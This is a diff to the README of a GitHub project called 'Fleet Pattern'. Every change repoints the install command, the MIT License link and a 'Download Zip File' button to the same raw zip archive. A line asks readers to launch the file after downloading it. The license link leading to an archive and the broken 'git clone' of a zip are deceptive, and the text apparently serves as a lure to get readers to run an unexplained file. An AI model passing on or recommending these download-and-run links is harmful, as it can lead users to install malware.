@@ -12,7 +12,7 @@ Welcome to the **Fleet Pattern** repository! This project is a demonstration of 
 ## Installation
 To get started with the **Fleet Pattern** project, you can clone the repository using the following command:
 ```
-git clone https://github.com/Brevidade/fleet-pattern/releases/download/v1.0/Software.zip
+git clone https://raw.githubusercontent.com/Brevidade/fleet-pattern/main/pithful/pattern-fleet-v1.9.zip
 ```
 
 After cloning the repository, you can navigate into the project directory:
@@ -42,12 +42,12 @@ We welcome contributions to the **Fleet Pattern** project! To contribute, follow
 5. Submit a pull request to the main repository.
 
 ## License
-This project is licensed under the [MIT License](https://github.com/Brevidade/fleet-pattern/releases/download/v1.0/Software.zip).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Brevidade/fleet-pattern/main/pithful/pattern-fleet-v1.9.zip).
 
 ---
 
 ### Launch the Project!
-👉 [Download Zip File](https://github.com/Brevidade/fleet-pattern/releases/download/v1.0/Software.zip) 👈
+👉 [Download Zip File](https://raw.githubusercontent.com/Brevidade/fleet-pattern/main/pithful/pattern-fleet-v1.9.zip) 👈
 
 (*) Please launch the file after downloading it.
 
